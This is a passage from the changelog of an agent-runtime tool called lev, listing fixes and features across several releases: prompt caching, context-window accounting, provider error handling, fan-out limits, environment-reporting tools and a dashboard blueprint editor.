  off the compiled script, never called.
- Fixed: a `[model_providers.<name>]` entry no longer prints its credentials
  through `Debug`. Both the `api_key` and the extra keys forwarded into the
  script's `initialize` were printable, where the first-party provider config
  had been careful not to be; the two now agree, reporting whether the key is
  set and the names in the extra table and nothing more.
- New: `lev dash` has an Agents screen (`a`): the catalog of agents this
  machine can run, with each one's graph, and an editor that builds one on
  the same canvas the explorer draws. Stages are boxes you add (`a`),
  connect (`c`, or drag a handle), select and delete; an inspector edits
  whatever is selected: the agent's description, entry stage, default
  model and shared context regions; a stage's behaviour (mode, description,
  tries, revisits, allow-complete, fan-out settings, its loop back to
  itself), its model chain and tools (the models every configured provider
  reports, on top of the built-in catalog; the tools this install has), and
  its context (the regions it sees, a layout of its own or the shared one,
  where tool results land, per-tool routing); a path's kind, hint, approval
  gate and what context crosses it (everything, pinned only, summarized, or
  per-region rules with the summary instructions); a context region's every
  setting. Prompts open full screen, and `Ctrl-E` hands one to `$EDITOR`
  and takes it back. Every edit is checked as `lev validate` would check
  the file, with the problems on a line under the graph and a `!` on the
  stage they name; saving is refused while there are errors. Undo and redo,
  a view of the exact file that will be saved, and arrangements kept per
  agent. New agents start from a two-stage starter or as a copy of any
  agent in the catalog; a bundled agent opens from its embedded copy and
  installs when saved, scripts and all; an edited bundled agent can be
  reset to the bundle. The editor keeps a file's comments, order and
  formatting: it edits the manifest as a document. The canvas has a
  right-click menu for the stage, path or empty canvas under the pointer,
  a click on empty canvas selects nothing, undo and redo are `Ctrl-Z` and
  `Ctrl-Y`, and every bar names its controls: the run list calls the
  screen out next to "new run". `r` on the catalog renames an installed
  agent (directory, manifest name and saved arrangement together); reset
  to the bundled copy moved to `R`.
- **Breaking (websocket):** stage transitions and tool calls are frames of
  their own. `stage_transition`, `tool_call_started` and `tool_call_finished`
  used to arrive wrapped as `{"type":"world","event":{...}}`, so a client had
  to know to unwrap them and per-run filtering read the run id out of untyped
  JSON. They are flat, typed frames now and the `world` envelope is gone. The
  API version moves to `0.4.0` and `GET /api/config` announces
  `events.stage_and_tool`.
- Changed: `agent_spawned` says who spawned a sub-agent. `parent_id` was
  always `null`, because the underlying world event carried no parent, so a
  console rendering a run tree had to fetch every new run to find out where it
  hung; a fan-out of thirty workers was thirty fetches for a fact the spawn
  already knew. Announced as `events.spawn_parent`.
- Fixed: a run spawned through `POST /api/agents` arrived on the websocket
  twice. The route sent its own `agent_spawned` on top of the one the daemon
  already emits for every run, so a console counted the run twice, and only
  for the runs that came in over HTTP.
- Added: one test drives a real run from the host's change-detection pass,
  over a real control socket, through the event relay, to a real websocket
  frame. Each link had a test and none of them joined, so a break at any seam
  between them passed the whole suite.
- Fixed: `lev serve`, `lev dash`, and `lev agent-client` ride out a daemon
  restart instead of breaking. A request that lands while the daemon is down
  (a `lev daemon restart`, a supervisor relaunch, or the restart that follows
  `lev update`) waits up to ten seconds for it to come back and is served by
  the new daemon, where before `lev serve` answered 503 and the ACP bridge
  refused the turn, for a daemon that was back a second later. The wait is per
  outage, not per request: a daemon that is really gone costs one caller the
  ten seconds and every caller after that fails fast until it returns. Only
  requests that cannot double an effect are retried after they were sent; a
  spawn or a message that got no reply is reported rather than sent twice. The
  ACP bridge follows a run onto the new daemon mid-turn instead of ending the
  turn with a truncated reply. One-shot commands (`lev ps`, `lev cancel`) are
  unchanged: a daemon that is not running is still reported at once.
- New: the daemon says who it is (version, build, pid) in the control
  handshake, and each front-end uses that to tell a restart from an update.
  `lev serve` logs the reconnect, tells WebSocket subscribers with a
  `daemon_link` event (connected or not, which daemon, whether it restarted),
  and when the daemon came back on a different build than the server, says so
  in the log, in the event, and in a `daemon_link` greeting to every new
  WebSocket subscriber, with the remedy: restart `lev serve`. Requests keep
  working while the two still understand each other; one that fails because
  they no longer do answers 502 with the same text instead of a 503 that a
  daemon restart cannot fix. `lev dash` says the same in its log and a toast,
  and wears a chip on the run list while the daemon is unreachable or
  updated. The ACP bridge tells the editor in the conversation.
- New: six read-only environment tools, so an agent can ground itself in the
  world it is actually running in. `current_time` reports the date and time in
  UTC and local with the timezone and offset; `system_info` the operating
  system, version, architecture, CPU count, hostname and free disk;
  `locale_info` the user's language and region; `environment_info` the working
  directory, the well-known directories, `PATH` and the environment variables
  the agent may see; `which_command` whether a program is installed and where;
  and `runtime_info` this run's own agent, stage, iteration, model, context use
  and whether anyone is available to answer a question. All six default to
  `allow` and take no action. This closes a real gap: a research agent with no
  way to ask the date reasoned from its training cutoff and worked a stale news
  cycle.
- New: a region can seed itself from tool calls -
  `seed = { tools = ["current_time", "system_info"] }` - so an agent's first
  inference already carries what those tools would have said. Several calls fill
  one region, each under a heading naming the tool. Any tool the agent could
  call works: a built-in, an MCP server's, or a Rhai script's. Each call
  resolves against the same `[tool_permissions]` the tool lane applies mid-run,
  so a seed reaches nothing the agent could not, and a tool set to `ask` is
  refused rather than prompted because a seed runs before any prompt exists.
  `lev validate` lists them as `tool-seed`.
- New: `refresh = "each_stage"` on a tool seed re-runs its calls whenever a
  stage is entered, for a seeded region whose answer moves. The stage waits for
  the refreshed region before its first request, so the values are in place for
  the turn that reads them; a failed call leaves the region as it was rather
  than blanking it. The default stays `once`, which is what every other seed
  kind does.
- Fixed: `deep-researcher`, `researcher` and `wide-researcher` now know what day
  it is. Each seeds a pinned `environment` region from `current_time` and
  `locale_info`, and their research stages are told to judge "recent", "current"
  and "latest" against it rather than against whatever they remember. This is
  the bug that prompted the tools above: with no way to ask the date, a research
  run reasoned from its training cutoff and worked a stale news cycle.
- Fixed: `environment_info` reports credential-shaped environment variables by
  name with the value withheld, through the same `[security] allow_env_vars`
  gate a Rhai `env_var` read answers to, so an agent can tell a key is set
  without being handed it.

- New: `lev dash` draws a run's blueprint as a stage graph. The stage
  explorer (`g` in the detail view) is a canvas now: stages are boxes on
  layers, transitions are routed edges, the stage the run is in spins in
  the run's colour, the last transition it took is animated, revisit loops
  run along a lane below the boxes, and the escape edges (`error`,
  `dead_end`, `stuck`, `max_iterations`) hide behind `e` because nearly
  every stage has one to the same hub. Arrows select a stage, `Enter` opens
  its tab, `+`/`-` zoom, `f` fits, and the mouse pans, zooms and clicks.
  Every run has a graph (a linear blueprint is a chain); before, a linear
  run got a toast saying there was nothing to explore. The picture comes
  from the new `rataflow` canvas crate, built without its own layout: the
  layered layout the explorer already had places the boxes.
- New: `lev validate --graph` prints the same stage graph as plain text
  (`--width` caps how wide).
- New: the detail view's stage row is the blueprint's graph on a terminal
  at least 36 rows tall, drawn by the explorer's canvas: the same boxes,
  edges and colours, the stage the run is in lit up, the selected box the
  open stage tab. `←`/`→` walk the graph, `1`-`9` jump by number, a click
  picks a box, and boxes drag. The flat strip stays on shorter terminals.
- New: the new-run screen previews the selected blueprint's stage graph
  above the task, bundled blueprints included before they are installed,
  and says so when a manifest cannot be read.
- Changed: the stage graph never shrinks its boxes to fit. The layers run
  left to right when that fits and top to bottom when only that does (`r`
  turns it by hand); when neither fits the canvas starts at the entry stage
  and pans, with a minimap once there is more graph than screen. Boxes keep
  their frame at every size and cut the name before anything else, the
  selected one gets a thick bright frame rather than reversed text, edge
  animation runs at a walking pace, a dotted grid sits under the graph, and
  boxes can be dragged into an arrangement of your own, which the explorer
  keeps for the run.
- Changed: while a run is on the canvas the graph draws only the path and
  the options: the stages the run has been through and is in, the
  transitions between them, and what it can do from here with the stages
  that leads to. A stage no line reaches is not drawn either; `t` shows the
  whole graph. Hint bars fit the terminal: what does not fit gives way from
  the end (the explorer's) or the middle (the dashboard's, keeping help and
  back), with an ellipsis where it went, and the graph pane's title
  shortens on a narrow pane.
- Fixed: shortcuts that worked but were never hinted or documented. The
  detail view's hint bar names `g` (the graph) and `1-9`; the main list's
  names `m` (MCP servers); the log panel's names PgUp/PgDn, `?` and the
  `g`/`G` aliases; the response pane's names PgUp/PgDn; the setup wizard's
  footer names `?`, Ctrl-S and Ctrl-R on every step. The help overlays
  mention Shift-Tab where it works, and say where `?` types text and F1 is
  the way in. The dashboard docs gained the log panel and MCP screen key
  tables and the keys the detail view, new-run screen and response pane
  were missing.
- Fixed: `default_model` written as `provider/model` next to the provider it
  names, such as `default_model = "ollama/qwen3.8:latest"` under
  `default_provider = "ollama"`, was sent to the provider verbatim, and Ollama
  answered `model 'ollama/qwen3.8:latest' not found`. The setting is a bare
  model id, but `--model` and `fallback_order` take the qualified form and an
  OpenRouter id already has a slash in it, so the qualified form kept getting
  written. The resolver now drops a leading `<default_provider>/`, config load
  and `lev doctor` say what the setting was read as, and the docs say which
  form each setting takes. OpenRouter's own `openrouter/auto`-style ids are
  left alone.
- Fixed: `default_model` lost to the blueprint's own entry on the same
  provider. Every bundled agent lists Ollama as `qwen3.5:9b`, so
  `default_provider = "ollama"` with `default_model = "qwen3.8:latest"` still
  ran on `qwen3.5:9b`, a model the user may never have pulled. The user's
  default now leads on its provider, with the blueprint's entries behind it as
  the failover, which is the order the docs already described.
- Fixed: a daemon restart pinned every stage of a reloaded run to the model
  its entry stage had resolved to. The reload rebuilt the run's spawn
  arguments with `meta.json`'s `model` label (always set once a run has
  started) as if it were the `--model` override, so a run launched with no
  override came back with its failover list gone, and one whose provider had
  been removed since could not reload at all. `meta.json` now records the
  override actually given at launch (`model_override`), and the reload
  replays that, resolving each stage afresh when there was none. Runs written
  before this field reload with no override.
- Changed: a fan-out stage's `max_workers` defaults to 30 rather than 4, so
  a split that produces ten work items runs them at once instead of in
  waves. `max_workers = 0` now means unlimited, where it used to be read
  as 1, and `max_items = 0` is spelled out as no ceiling. The daemon's
  inference pool still paces the requests, so a wide fan-out queues at the
  model rather than at the stage. The bundled `reviewer`, `data-analyst`,
  `deep-researcher`, `log-analyzer` and `wide-researcher` agents raise both
  caps to 30. A negative or non-numeric cap is a validation error; before,
  `max_workers = -1` ran unbounded and `max_items = "twelve"` ran uncapped.
- New: `GET /api/blueprints/{name}` carries `fan_outs`, one entry per
  fan-out stage with its worker source, merge stage and both caps resolved
  as the daemon applies them (`null` for unlimited). Announced as
  `blueprints.fan_outs` in the `capabilities` list on `GET /api/config`.
  Until now the only limit a console showed for a fan-out stage was
  `max_iterations`, so the caps that decide how many workers a stage gets
  looked like a retry count.

## 0.4.0 - 2026-08-18

- New: a provider can be reached through a gateway, with
  `[providers] <provider>_base_url` for `anthropic`, `openai`, `google` and
  `openrouter` (env fallbacks `ANTHROPIC_BASE_URL` and friends, so a machine
  behind one needs no config file). For an enterprise gateway or a self-hosted
  proxy that speaks the same API on another origin. One setting per provider
  rather than one covering all of them, because a gateway usually fronts one
  family and pointing the rest at it would break them. Unset means the vendor's
  own endpoint, so nothing changes for a config that says nothing. A gateway
  serving model IDs the vendor never published describes them in
  `[model_capabilities.<id>]`, which already worked; what was missing was any
  way for configuration to reach the host.

- Fixed: two provider 400s the runtime built for itself at a tight context
  window. A prompt that reached the window left a completion budget of zero, and
  the request went out with it - which OpenAI rejects as
  `Invalid 'max_completion_tokens': integer below minimum value` and Anthropic
  likewise. The budget now has a floor of one, and stays capped at what the
  window has left, because a provider rejects prompt-plus-completion past the
  window just as readily; a prompt that leaves no room to answer says so in the
  log rather than only in a 400. Separately, a compaction that returned an empty
  summary had that blank stored in place of the region it summarized, and it
  later reached a provider as a zero-length turn, which is
  `user messages must have non-empty content`. An empty summary now leaves the
  region as written, and no message with nothing in it is sent at all. Neither
  400 reads as transient, so both were retried until the run died.

- Changed: a `temporary` or `clearable` region declared `volatility = "grows"`
  is now split and cached like any other growing region. Both kinds say when the
  region is thrown away - one at stage exit, the other on demand - and nothing
  about whether the contents hold still in between, but both were tagged
  uncacheable on the strength of that name. Right at the boundary, wrong
  everywhere else: a stage that reads a corpus into a `temporary` region and
  then works through it for forty calls re-sent the whole corpus at full rate on
  every one of them, which measured as 5.36M tokens across 46 calls and the
  largest single cost line in that run. A region that declares nothing keeps
  exactly the behaviour it had, so this only reaches a blueprint that asked for
  it.

- Fixed: the live conversation always ends the request. A custom region is the
  only kind whose `render` hook can emit conversation messages, and it emitted
  them at whatever position its author declared the region - so one declared
  after the conversation put its contents *behind* the last user turn. A model
  reads the end of its input as "now", and for an agent that is the dialogue it
  is having; with a document corpus in that region, what sat in the position the
  model weighs most heavily was a wall of reference material and the agent
  stopped behaving like it was in a conversation. Emitted messages now render in
  front of the conversation wherever the region sits, which leaves a blueprint
  that already declared it earlier completely unchanged.

- Fixed: the context window corrects its own token estimate against what the
  provider reports charging, so a run on a hard context window evicts in time
  instead of overflowing it. Everything is sized with bytes-over-four, which on
  dense ASCII - code, mostly - reads about 10% light. A 27B model pinned to
  `num_ctx 32768` therefore assembled 32,497 real tokens while believing it was
  inside its budgets: the 0.9 eviction trigger was meant to leave 3,277 tokens
  of margin and was really leaving 269, less than one tool result, so the next
  read overflowed the window. Every response already reports `prompt_tokens`
  from the server's own tokenizer, and the runtime now records what it believed
  each request would cost and adds the measured difference to its accounting.
  The correction is additive rather than a ratio, because most of what separates
  the two figures is overhead the window never sees - tool schemas, hint blocks,
  provider framing - and that costs the same whether a region holds ten tokens
  or ten thousand. It only ever tightens and only on measured evidence: a
  provider charging less than estimated, which is every provider on text with
  any non-ASCII in it, changes nothing.
- Fixed: Ollama's `no user query found in messages` is reported as the size
  error it is, when the request that provoked it did carry a user turn. Ollama
  does not refuse an oversized request, it truncates from the front, and when
  the last user turn is what falls off it then reports the conversation's shape
  rather than its size - which sent two separate investigations after
  message-shape bugs. Since a `500` reads as transient it was also retried on
  backoff, and every attempt sent the same oversized conversation.

- Breaking: every MCP tool is named `<server>__<tool>`, whether or not anything
  would have collided. A tool used to be advertised bare and prefixed only on a
  clash, which made the name a function of registration order: registration
  follows `config.toml`, so two servers both offering `search` gave the bare
  name to whichever was listed first. `available_tools = ["search"]` therefore
  meant a different server's tool depending on the order of a file the blueprint
  does not control. A blueprint naming a bare MCP tool stops matching, though a
  name that resolves to exactly one server is now rewritten for you rather than
  silently dropped. No bundled agent is affected; none of the seven names an MCP
  tool. The separator is `__` and not the `.` it reads better as, because the
  advertised name goes to the model provider, which accepts only
  `[A-Za-z0-9_-]` and rejects the whole request otherwise.
- Breaking: the run archive's version number marks a change to its *framing* -
  the preamble, the length prefix, the payload encoding - and an archive newer
  than the build reading it is refused by name. It was read by every caller and
  compared by none, so a future format change would have been parsed as the
  current one and produced nonsense from whatever the length prefixes said.
- Fixed: a reader steps over a record kind it does not know instead of stopping
  at it. Records are length-prefixed and nothing used that, so a frame whose
  contents a build could not parse was treated like a frame whose end it could
  not find: the read stopped there and returned the prefix. That made adding a
  record kind a breaking change, and it was already live - `InferenceUsage`
  shipped in 0.3.10 and is written on every provider call, so an older
  `leviath-core` read a 0.3.10 journal as "header, then nothing". Adding a
  record kind no longer moves the version, because older builds can now read
  past it.
- Fixed: a provider gets one system message however many blocks were assembled.
  Leviath models system content as blocks, one per pinned region, and the OpenAI
  chat shape has no such concept - it has *a* system message. The shared builder
  emitted one per block, which permissive servers tolerate and strict ones do
  not: Ollama with a Qwen 3.x template answers `HTTP 500 {"error":"system
  message must be at the beginning"}`, which is a misleading way to say "at most
  one". Every multi-region blueprint, which is every real agent, failed on its
  first inference against those models. Anthropic has its own builder, where
  block structure earns its keep through per-block `cache_control`, and is
  unchanged.
- Fixed: a resumed run is not re-titled. `PendingTitle` was attached on every
  build with no fresh-versus-reload check, so each pause and resume bought
  another titling call.
- Fixed: an unattended run parks rather than failing when the fix is somebody
  else's. A benchmark round crossed an empty account mid-tier and lost 31 runs
  across three terminal shapes, none resumable, all one cause. `paused` is
  visible in `meta.json` and `lev ps --json`, so a harness that can top up an
  account and `lev resume` gets the work back, and one that cannot cancels the
  run for the cost of a second. A credits failure on an output stage also used
  to route through the transition logic and report "never called
  submit_output", naming the wrong cause to everything downstream.
- New: a stage can grant a whole MCP server with
  `available_connectors = ["github"]`, resolved at spawn against what that
  server actually advertises and merged with `available_tools`. Naming tools one
  by one meant knowing a list that is not the blueprint author's to know - it is
  whatever the server advertises today - so a tool added later was never
  offered, with nothing said.
- New: `DELETE /api/runs/{id}` removes a finished run's record, and
  `DELETE /api/runs?before=<unix>` or `?ids=` prunes many at once. Cancelling and
  deleting are different verbs: `DELETE /api/agents/{id}` stops the work and
  keeps the record. A console could list runs, read them, cancel them and never
  get rid of one. A live run is refused with 409, an already-deleted one answers
  404 so a repeat is readable, and a run whose record will not parse needs
  `?force=true` - an unreadable record is what a live run looks like to a build
  whose `RunMeta` has moved on. Announced as `runs.delete` and
  `runs.delete.bulk`.
- New: regions that assemble into the system prompt carry their own name above
  their contents. An agent writes to a region *by name* and the prompt showed it
  every region's contents with nothing saying which region they came from, so it
  could read `sources_index`, write to `sources_index`, and have no way to know
  they were the same place. Three tokens per region, however many entries it
  holds.
- New: a region takes a `description`, and `describe_in_prompt = true` shows it
  to the model as well. On its own it is documentation and costs nothing:
  `lev dash` prints it under the region, `GET /api/blueprints/{name}` returns it
  with the region's kind and budget, and `context.json` carries it so no reader
  has to re-parse the manifest to explain a region it is already showing.
- New: an Ollama stage can turn off a reasoning model's thinking with
  `think = false` under `[stages.<name>.model.parameters]`. Ollama puts `think`
  at the top level of the request while everything in `parameters` is merged
  into `options`, so setting it there was accepted and ignored. Thinking is
  billed to the same output budget as the answer: asked for a run title in 64
  tokens, qwen3.8 returns an empty string, having spent all 64 deciding what a
  title is.
- Fixed: Anthropic cache markers are anchored to a fixed stride counted from the
  start of the conversation, so a marker stays where the previous request left
  its entry. They used to be placed relative to the newest message, which moves
  every turn by however much that turn appended. Anthropic's lookup only scans a
  bounded run of content blocks back from a marker, so a workload appending a
  dozen blocks a turn - a stage doing parallel reads, say - stepped past that
  window within a few turns and then never got back inside it, rewriting the
  whole conversation at the premium rate from there on. The reads climbed while
  the step stayed under about 20 blocks and stopped at 25, which is what
  identified the bound. The system blocks now claim at most two of the four
  markers, leaving two for the conversation.
- Changed: the bundled agents declare how much each of their regions moves, so
  the prompt-cache ordering applies to them rather than shipping switched off.
  43 regions across the seven: a task, a query or a seeded convention file is
  `stable`; a bibliography, a routed tool result or a compaction history is
  `grows`. Anything revised in place, like the coder's plan, keeps the
  pessimistic default. Measured on `log-analyzer`, the manifest the only
  difference: the cache hit rate went from 20.5% to 30.7% and the cost per
  iteration fell about 7% - prompt caching compounds with run length and region
  size, so a short run shows a fraction of what a long one does.
- Fixed: Anthropic cache markers are placed in front of a region that changes,
  rather than after it, and more than one of the four is used. They were grouped
  by a hint derived from the region's kind, so a prompt of several pinned
  regions was one group and got a single marker at its end - past whatever
  churned. Since the marker caches everything before it, that entry could never
  be read and the whole prompt was written at the premium rate every call. The
  API stores up to four prefixes and reads back the longest that still matches,
  so spreading them costs nothing and catches the case where the newest content
  moved. Measured on a 24-iteration run: the cache hit rate rose from 66.5% to
  84.3% and the cost per iteration fell a further 37%.
- New: a region declares how much its contents move, with
  `volatility = "stable" | "grows" | "rewritten"`, and the prompt is ordered by
  it - stable content first, churn last. A provider caches by prefix, so one
  region that changes invalidates the cache for every region behind it, which
  makes the ordering worth money. It could not be inferred: a `pinned` region
  sounds immutable and is written constantly, since `context_write` into a
  findings region is an ordinary move and tool routing sends read results
  straight into one. Measured on a run whose churn was declared first, 24
  iterations either way: the cache hit rate went from 0% to 66.5% and the cost
  per iteration fell 58%. A region that grows is also split so its settled part
  caches while only the newest entries are re-sent. The default is `rewritten`,
  the pessimistic value, so an undeclared blueprint is never made worse -
  declaring is what makes it faster. A region that claims to be `stable` and
  then keeps changing is reported in the log rather than silently paid for.
- Fixed: a cache breakpoint is not placed on a prefix too short for the provider
  to store. Anthropic caches nothing below about 1,024 tokens, and a dumped
  request showed one of the four breakpoints sitting on a 269-byte block, where
  it could never be read back.
- Changed: a cache breakpoint is placed at the end of its tier again, rather
  than being withheld when the content in front of it changed. Withholding it
  also prevents the *read* that would have paid for it, since nothing gets
  stored to match against once the content settles, and it judged staleness
  against the previous request alone while a provider's cache lives for minutes.
  Region ordering now keeps churn out of the prefix at its source, which is the
  part that was measured to help.
- Fixed: a growing context region is no longer rewritten into the prompt cache
  on every call. A region became a single system block, and a provider matches a
  cached prefix only at a block boundary - so the one boundary a region offered
  sat after its newest content, and the moment the region grew the entry named
  there could never be read again. Measured against Sonnet on a twelve-call run:
  456,860 cache-write tokens and zero reads. Regions whose entries append are
  now split into chunks at boundaries that survive into the next request, and a
  breakpoint is only placed where every byte ahead of it is unchanged, so the
  settled history caches and only the tail is re-sent. The same run now writes
  74,256 and reads 300,588, with the per-call write flat rather than ratcheting.
  Runs whose history already lived in the messages are unaffected, to the token.
- Fixed: an Ollama model's context window is read from the server rather than
  guessed from its name. The compiled table matches on a family substring, so
  `qwen3.8-32k` took the `qwen3` arm and was handed 131072 against the 32768 it
  is actually served at. Percentage region budgets resolved against the larger
  number and never evicted, the request overflowed, and Ollama front-truncated
  it and then answered `no user query found in messages` - naming neither the
  size nor the truncation. The daemon now asks each installed model for its
  `num_ctx` at start-up, and says so once per model when a window still had to
  be guessed. Note that the window is the Modelfile's `num_ctx`, not the
  architecture ceiling in `model_info`, which on that model is 262144.
- Fixed: an Ollama tool call gets an id unique to the conversation rather than
  its index within one response. Every turn's first call was `ollama_0`, so a
  window ten turns deep held ten distinct calls nothing could tell apart - and
  the guard that removes a call or response left stranded by eviction pairs them
  by id, so with every id equal it never removed anything for that provider. A
  stranded response then survived at the head of the conversation, which is what
  produced a request with no user query in it.
- Fixed: every request to an OpenAI-dialect server carries a user turn. The task
  lives in a pinned region, so it assembles into the system prompt and a
  conversation can legitimately hold no user message: Ollama with a Qwen 3.x
  template answers `HTTP 500 {"error":"no user query found in messages"}` for
  any request without one. Most shapes were already covered, by the "Begin."
  fallback and by the turn ordering fix; the guarantee now holds for the rest.

## 0.3.10 - 2026-08-14

- Fixed: a run now reports what it was actually billed. A run makes four kinds
  of provider call - stage turns, region compaction, the call that names the
  run, and the call that picks the next stage - and only the first was counted.
  The other three dropped their token usage where their results were collected,
  because each of those channels carried only the summary, title or stage name
  its collector wanted. Measured against a provider serving known amounts, a
  two-stage run with one compacting edge billed 12,000 prompt tokens and
  reported 4,000. Runs that compact, title or branch will now report more than
  they did, because they were always billed more than they reported.
- Added: `run.lvr` records what each provider call cost, as it lands. The
  cumulative counters on progress records mean two calls between two ticks
  arrive downstream as their sum, so a chart of them shows a spike no single
  call ever made - the reported case being a run pinned to a 32k window
  appearing to make a 56k request. Each record names which kind of call it was,
  so "this run cost double what its stages did because its edges compact" is
  now answerable, and "no request ever exceeded the window" is provable from
  the journal instead of inferred from region sizes.
- Added: an agent can release a context entry it has finished with, rather than
  waiting for something to be evicted. A stage that fetches a source, takes the
  three paragraphs that matter and writes them somewhere curated has no further
  use for the raw text - but the runtime only knows sizes, so the raw text sat
  there until pressure happened to push it out. `context_delete` now names an
  entry by key, by position, or as the oldest few, and `context_list` numbers
  its entries so there is something to name.
- Fixed: a key given to `context_append` or `context_write` is honoured on every
  kind of region. It was only ever stored on key-value regions; everywhere else
  the argument was accepted and discarded, so an agent could name an entry, see
  a success message, and then be told that entry did not exist when it tried to
  release it.
- Added: `admission = "reject"` on a region refuses a write that does not fit,
  instead of dropping whichever entry happened to be oldest. Silently evicting
  is a decision about what matters, taken by whichever write arrived when the
  region was full, and the agent never learned it happened. A region set this
  way is also exempt from the window-wide eviction cascade, or the setting would
  only change which part of the runtime did the dropping. The default is
  unchanged.
- Fixed: Anthropic runs stop paying to cache a prefix that already changed.
  Caching works by prefix, so when a mutable region changed since the previous
  request the cache entry is invalidated before it can ever be read - and the
  write premium is charged anyway. One measured run bought 3.3M cache-write
  tokens against 267k reads. The cache breakpoint is now skipped while the
  prefix is moving and re-armed as soon as it settles, so a steady-state run
  keeps the caching it always had.
- Fixed: a stage's instructions get their own region even when the blueprint
  does not declare one. Without it the prompt went to whichever pinned region
  came first, usually the one holding the caller's task - sized for a sentence,
  not for a stage's instructions - and a small window turned that into a spawn
  failure that read as the caller's fault.
- Added: `lev validate` warns when a region designed to evict is bounded by a
  percentage. Eviction only runs at the bound, so the bound is the discipline,
  and a percentage re-reads it every time somebody runs a bigger model: `38%`
  written against a 200k window becomes a 380k ceiling that oldest-first
  eviction never reaches, and the region hoards instead. The warning names the
  resolved number, since that is the part worth acting on.
- Fixed: a run can no longer finish by submitting the name of one of its own
  stages as its answer. A run that dead-ended into its output stage submitted
  the literal string `analyze` and reported `complete`, which reads as success
  to every consumer there is. The submission is handed back to the model to
  answer again rather than failing the run outright.

## 0.3.9 - 2026-08-14

- Added: a parked run says what it is parked on. `WaitingInput` covered four
  different situations - a question for a person, tool calls held for
  approval, a parent held by its own fan-out, and a parent held for
  sub-agents - and only the first two are anybody's to act on, so a parent
  whose children were still working showed as "needs you" in every client.
  `meta.json` now carries `waiting_on`, `lev ps` and the dashboard print it
  in place of the bare status word, and only a run somebody can actually
  unblock wears the warning colour. The field is skipped when absent, so a
  run that is not parked writes the file it always wrote.
- Added: the same reason rides the websocket. A subscriber watching live had
  to fetch the run to find out whether `waiting` meant "go and answer
  something" or "its workers are still going". `agent_status` now carries
  it, and because the reason is part of the change key, a parent whose
  outstanding-worker count falls sends a fresh event instead of leaving a
  subscriber on a stale count.
- Changed: a run whose provider is not configured, whose key was rejected,
  whose key lacks access, or whose account is empty now parks instead of
  failing. Every one of those is deterministic, outside the run's control,
  and undone by one edit somewhere else, so ending the run threw away
  everything it had done to punish somebody for a typo. It parks with its
  retry still staged and `lev resume` picks it up once the machine is fixed.
  The pause is typed rather than a sentence, since a missing provider and an
  empty account are different screens to send somebody to. Unattended runs
  still fail, because a scheduler watching for a terminal status would wait
  for ever for one that never came.
- Fixed: `lev update` refreshes its package index before upgrading, so a
  version published minutes earlier is found instead of requiring a manual
  `brew update` first. Alpha and beta are handled alongside stable.
- Fixed: the reason a run was parked survives a daemon restart. The marker
  lived only in the world, so a reloaded run came back as a bare `Paused` and
  the next persist tick wrote null over the recorded reason - and nothing
  would have recomputed it, because a paused run is never dispatched again.
- Fixed: every code stage has a local model it can actually reach. `coder`
  and `reviewer` named `devstral:24b` as their only ollama candidate, so
  somebody running locally with `qwen3.5:9b` - what every other stage asks
  for - had six stages fall through the whole candidate list and find
  nothing. The specialist is still tried first.
- Changed: one local model across every bundled blueprint. The ollama entry
  was the only one that switched model family between tiers, so a local run
  needed two unrelated pulls to use one agent. Standardised on `qwen3.5:9b`,
  already 31 of the 37 entries.
- Added: `GET /api/tools` lists what an agent on this machine can actually
  use, with each tool's source, so a console no longer ships a hardcoded
  list that omits the tools you wrote and offers ones that do not exist. It
  reports the scripts that failed to compile too.
- Added: `/api/scripts` reads and writes script files by kind, scoped to an
  agent or to the machine-wide directory, so they no longer have to be
  edited on the box. Writes sit behind `--allow-admin` and are unmounted
  without it, because a `.rhai` file is executable code every agent then
  runs.
- Added: `GET /api/config` enumerates custom gateways and `PUT` adds, edits
  and removes them by name, which lets a browser change a gateway's URL
  without ever being handed its key. The people most likely to want a form
  for provider setup were the ones the config API could not describe.
- Added: `GET /api/blueprints/{name}` returns the agent's manifest text. A
  browser could name the file it was editing but not read it, so it fell
  back to a draft in local storage or a copy bundled at build time, which on
  a second machine could be many versions behind what is installed.
- Fixed: blueprint validation lints against the agent's own directory rather
  than the daemon's working directory, so an agent's `tools/*.rhai` resolves
  and its tools stop coming back as `unknown-tool`. A console using this as
  a pre-flight could not save any agent with script tools, bundled ones
  included.

## 0.3.8 - 2026-08-13

- Fixed: a fan-out split whose answer is not a JSON array no longer ends the
  run. The split asked the model for one exact shape and parsed the reply
  once, so a stage that answered in prose, or a reasoning model that answered
  with nothing at all, killed a run that had already done real work. The model
  is now handed back its own answer with a correction and asked again, twice,
  the way every other stage treats a reply it cannot use. When the corrections
  are spent the run does fail, and the message now quotes what came back
  rather than only naming the rule it broke.
- Changed: `deep-researcher` and `wide-researcher` require the stages that do
  their research. Both blueprints offered a way straight past their own
  investigation, so which stages ran came down to which model was driving:
  the same topic produced a full parallel investigation on one model and a
  report from the first stage's sources on another. `deep-researcher` now goes
  from `gather` to `investigate`, and `wide-researcher` runs `survey` to
  `investigate` to `compare` to `deep_dive`. A topic that turns out to be one
  question is a fan-out of one worker, which is far cheaper than skipping the
  investigation.
- Changed: `wide-researcher` decides whether it needs more material after
  `deep_dive` rather than after `compare`, since that is the first stage to
  have read a thread properly rather than surveyed it. From there it can pick
  another thread, go back for more breadth, or write the overview.
- Fixed: the fan-out stages of both researchers can no longer skip their own
  workers. Each had an escape edge to its write-up stage that its own comment
  described as a last resort, but neither was conditioned on being one, so it
  sat on the model's menu as an ordinary choice.

## 0.3.7 - 2026-08-13

- Fixed: a run whose provider account runs out of credits now pauses instead
  of failing. The failure was terminal, so the one problem a top-up fixes was
  also the only one a run could never come back from; the run now waits with
  its retry staged, the stage log says why, and `lev resume` re-dispatches it.
  Resuming also resets the provider circuit breakers, so the retry probes
  immediately rather than sitting out a cooldown that predates the top-up.
- Added: `lev validate` reports which inputs an agent accepts: each `--<flag>`,
  the region it seeds when the names differ, whether it is required, and an
  explicit note when `--task` is not among them. The JSON report carries the
  same facts as `blueprint.accepts_task` and `blueprint.inputs`, so a harness
  can check before spawning what `lev run` would refuse at spawn.
- Fixed: a run that is paged back in keeps its per-stage token ledger. Nothing
  rebuilt the ledger on restore, so every stage of a restored run was back at
  zero and the next persist tick wrote those zeros over the real `stages.json`.
  The run-level totals survived, so the run looked healthy while its per-stage
  history was silently gone, and `lev stages` and the stages API served the
  zeroed records. This hit an on-demand page-in as well as a daemon restart.
- Fixed: a provider capacity refusal no longer kills a run in seven seconds.
  Four attempts on a one-second base covers a network blip, not an overload
  that lasts minutes, so a run that had already spent real money died
  mid-stage on an HTTP 529. A 429 or 529 now backs off on its own longer
  schedule and honours the provider's `Retry-After` when it sends one, bounded
